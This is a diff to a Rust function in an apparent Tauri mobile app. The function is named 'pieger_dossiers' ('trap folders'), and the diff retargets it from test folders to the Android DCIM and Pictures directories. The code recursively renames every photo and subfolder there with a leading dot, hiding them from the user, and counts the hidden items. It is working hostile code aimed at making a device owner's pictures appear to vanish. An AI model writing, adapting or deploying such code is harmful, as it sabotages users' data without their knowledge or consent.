@@ -1,35 +1,44 @@
 use std::fs;
-use std::path::Path;
+use std::path::{Path, PathBuf};
 
 #[tauri::command]
 fn pieger_dossiers() -> Result<String, String> {
     let dossiers = [
-        PathBuf::from("/storage/emulated/0/TEST1"),
-        PathBuf::from("/storage/emulated/0/TEST2"),
+        PathBuf::from("/storage/emulated/0/DCIM"),
+        PathBuf::from("/storage/emulated/0/Pictures"),
     ];
 
     let mut total = 0;
 
-    for dossier in dossiers {
-        let chemin = Path::new(dossier);
-
+    for chemin in dossiers {
         if !chemin.exists() {
             continue;
         }
 
         let mut elements = Vec::new();
-        parcourir(chemin, &mut elements);
 
-        // On renomme après le parcours pour éviter
-        // de modifier l'arborescence pendant read_dir().
+        parcourir(&chemin, &mut elements);
+
+        // On renomme les éléments les plus profonds en premier.
         for ancien in elements.into_iter().rev() {
             if let Some(parent) = ancien.parent() {
                 if let Some(nom) = ancien.file_name().and_then(|n| n.to_str()) {
-                    if !nom.starts_with('.') {
-                        let nouveau = parent.join(format!(".{}", nom));
+                    // Ne touche pas aux éléments déjà cachés.
+                    if nom.starts_with('.') {
+                        continue;
+                    }
 
-                        if fs::rename(&ancien, &nouveau).is_ok() {
+                    let nouveau = parent.join(format!(".{}", nom));
+
+                    match fs::rename(&ancien, &nouveau) {
+                        Ok(_) => {
                             total += 1;
+                        }
+                        Err(e) => {
+                            eprintln!(
+                                "Impossible de renommer {:?}: {}",
+                                ancien, e
+                            );
                         }
                     }
                 }
@@ -40,7 +49,7 @@ fn pieger_dossiers() -> Result<String, String> {
     Ok(format!("{} éléments renommés", total))
 }
 
-fn parcourir(dir: &Path, elements: &mut Vec<std::path::PathBuf>) {
+fn parcourir(dir: &Path, elements: &mut Vec<PathBuf>) {
     if let Ok(entries) = fs::read_dir(dir) {
         for entry in entries.flatten() {
             let path = entry.path();
